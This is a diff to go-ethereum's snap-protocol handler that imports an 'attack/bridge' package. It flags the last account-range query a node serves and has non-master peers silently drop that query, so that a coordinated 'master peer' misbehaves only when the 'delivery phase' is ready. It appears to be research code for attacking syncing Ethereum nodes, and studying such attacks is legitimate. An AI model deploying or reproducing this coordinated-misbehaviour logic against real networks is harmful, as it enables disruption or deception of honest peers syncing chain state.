@@ -32,6 +32,8 @@ import (
 	"github.com/ethereum/go-ethereum/p2p/enr"
 	"github.com/ethereum/go-ethereum/rlp"
 	"github.com/ethereum/go-ethereum/trie"
+
+	"github.com/ethereum/go-ethereum/attack/bridge"
 )
 
 const (
@@ -55,6 +57,10 @@ const (
 	// If we spend too much time, then it's a fairly high chance of timing out
 	// at the remote side, which means all the work is in vain.
 	maxTrieNodeTimeSpent = 5 * time.Second
+)
+
+var (
+	lastResponse = false
 )
 
 // Handler is a callback to invoke from an outside runner after the boilerplate
@@ -163,6 +169,15 @@ func HandleMessage(backend Backend, peer *Peer) error {
 		}
 		// Service the request, potentially returning nothing in case of errors
 		accounts, proofs := ServiceGetAccountRangeQuery(backend.Chain(), &req)
+
+		if lastResponse {
+			bridge.ServedLastRangeQuery()
+			if !bridge.IsMaster() {
+				return nil			// Drop the query if it is the last one and we are not the master peer.
+									// Indeed, we want to make sure the master peer misbehaves only when
+									// everything is ready to start the delivery phase.
+			}
+		}
 
 		// Send back anything accumulated (or empty in case of errors)
 		return p2p.Send(peer.rw, AccountRangeMsg, &AccountRangePacket{
@@ -299,6 +314,8 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 		size     uint64
 		last     common.Hash
 	)
+
+	lastResponseLocal := true
 	for it.Next() {
 		hash, account := it.Hash(), common.CopyBytes(it.Account())
 
@@ -316,10 +333,21 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 			break
 		}
 		if size > req.Bytes {
+			lastResponseLocal = false
 			break
 		}
 	}
 	it.Release()
+
+	if lastResponseLocal {
+		log.Info("Found last query", "root", req.Root, "origin", req.Origin, "limit", req.Bytes)
+		if !lastResponse {
+			lastResponse = true
+		} else {
+			log.Warn("Got last query, but lastResponse already set")
+		}
+	}
+
 
 	// Generate the Merkle proofs for the first and last account
 	proof := light.NewNodeSet()
@@ -337,6 +365,7 @@ func ServiceGetAccountRangeQuery(chain *core.BlockChain, req *GetAccountRangePac
 	for _, blob := range proof.NodeList() {
 		proofs = append(proofs, blob)
 	}
+	log.Info("Served account range", "from", req.Origin, "to", last)
 	return accounts, proofs
 }
 
